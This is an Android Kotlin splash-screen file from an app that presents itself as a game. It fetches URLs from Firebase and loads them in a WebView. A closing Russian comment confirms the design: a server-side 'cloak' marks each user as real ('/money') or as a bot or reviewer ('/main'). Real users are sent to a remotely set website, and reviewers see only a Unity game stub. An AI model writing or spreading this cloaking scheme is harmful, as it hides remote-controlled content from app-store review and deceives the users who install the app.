package com.match.game

import android.annotation.SuppressLint
import android.content.Intent
import android.util.Log
import android.view.View
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.ProgressBar
import com.dotmat.cheees.UnityPlayerActivity
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.match.game._core.BaseActivity
import kotlinx.android.synthetic.main.activity_web_view.*


/**
 * Created by Andriy Deputat email(andriy.deputat@gmail.com) on 3/13/19.
 */
class SplashActivity : BaseActivity() {

    private lateinit var webView: WebView
    private lateinit var progressBar: ProgressBar

    private lateinit var dataSnapshot: DataSnapshot

    private lateinit var database: DatabaseReference
    val badgeCount = 1

    override fun getContentView(): Int = R.layout.activity_web_view

    override fun initUI() {
        webView = web_view
        progressBar = progress_bar
    }



    override fun setUI() {
        logEvent("splash-screen")
        webView.webViewClient = object : WebViewClient() {
            /**
             * Check if url contains key words:
             * /money - needed user (launch WebViewActivity or show in browser)
             * /main - bot or unsuitable user (launch ContentActivity)
             */
            @SuppressLint("deprecated")
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                if (url.contains("/money")) {
                    // task url for web view or browser
//                    val taskUrl = dataSnapshot.child(TASK_URL).value as String
                    //val value = dataSnapshot.child(SHOW_IN).value as String
                    val taskUrl = dataSnapshot.child(TASK_URL).value as String

                    startActivity(
                            Intent(this@SplashActivity, WebViewActivity::class.java)
                        .putExtra(EXTRA_TASK_URL, taskUrl)
                    )
                    finish()
                } else if (url.contains("/main")) {
                    startActivity(Intent(this@SplashActivity, UnityPlayerActivity::class.java))
                    finish()
                }
                progressBar.visibility = View.GONE
                return false
            }
        }

        progressBar.visibility = View.VISIBLE


        database = FirebaseDatabase.getInstance().reference

        getValuesFromDatabase({
            dataSnapshot = it


            // load needed url to determine if user is suitable
            webView.loadUrl(it.child(SPLASH_URL).value as String)
        }, {
            Log.d("SplashErrActivity", "didn't work fetchremote")
            progressBar.visibility = View.GONE
        })
    }
}

/*
в initview инициализируется веб вью и прогресс бар в getcontentView берется нужная вьюшка для отображения
дальше мы получаем базу данных из baseactivity и грузим с фаербейса ссылку для слеш активити, дальше вызывается
shouldOverrideUrlLoading и там, в зависимости от того что вернула клоака money или main мы открываем либо веб вью с сайтом (получая ссылку все
с того же фаербейс в переменную taskUrl и передаем ее интентом в веб вью) либо в заглушку
 */